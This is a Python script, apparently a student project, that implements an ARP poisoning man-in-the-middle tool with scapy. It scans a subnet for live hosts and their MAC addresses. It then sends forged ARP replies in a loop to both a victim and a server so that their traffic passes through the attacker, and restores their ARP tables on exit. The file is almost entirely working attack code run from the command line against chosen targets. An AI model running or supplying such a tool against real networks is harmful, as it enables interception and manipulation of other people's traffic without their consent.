import scapy.all as sc;
import argparse;
import time;

# TODO:
# - Mitm optie maken die je automatisch mitm maakt
# - Silent vs All out options

### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 

# Example run code that should do something, where x is ip range: 
# python ARPpoisoning.py --scan x 
# When specific victim and server are found, where y and z are ip adresses: 
# python ARPpoisoning.py --victim y --server z


## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
# Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
def network_scan(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    # Note that sent is the ARP request I sent, received is the ARP reply.
    packet_pairs = sc.srp(final_packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

## Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 
# 3. we need to stop the attack in a proper way.

# (1.) Start the poisoning attack by sending fake ARP replies.
def poison(victim_ip, poison_ip, victim_mac):
    fake_packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip)
    sc.send(fake_packet, verbose=False)

# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    # First we do the same as in network scan.
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    packet_pairs = sc.srp(packet, timeout=2, verbose=False)[0]
    # Now get MAC adress if something replies
    for sent, received in packet_pairs:
        return received.hwsrc
    return None

# (3.) Sends real ARP replies to stop and clean up the attack.
def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
    packet = sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
    sc.send(packet, count=4, verbose=False)

## Now to start the attack, keep it goining, and stop it when we want.
# We try to keep the ARP table of the victim poisoned by sending packets in a loop.
def arp_poison_loop(victim_ip, server_ip):
    try:
        victim_mac = get_mac(victim_ip)
        server_mac = get_mac(server_ip)
        # Start loop
        while True:
            poison(victim_ip, server_ip, victim_mac)
            poison(server_ip, victim_ip, server_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        stop_attack(victim_ip, server_ip, victim_mac, server_mac)
        stop_attack(server_ip, victim_ip, server_mac, victim_mac)

## Now that everything is set up, we want to make it easier to use this.
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP poisoning tool")
    parser.add_argument("--victim", help="Victim IP adress")
    parser.add_argument("--server", help="Server IP adress")
    parser.add_argument("--scan", help="Network IP range to scan", default=None)
    # Let the user input become variables
    args = parser.parse_args()
    #if --scan was used, scan the network and print discobered adresses
    if args.scan:
        hosts=network_scan(args.scan)
        print("Found hosts:")
        for host in hosts:
            print(f"{host['ip']} - {host['mac']}")
    # if a victim and server are given, start the spoofing attack
    elif args.victim and args.server:
        arp_poison_loop(args.victim, args.server)
    # if wrong input was given, give help
    else:
        parser.print_help()
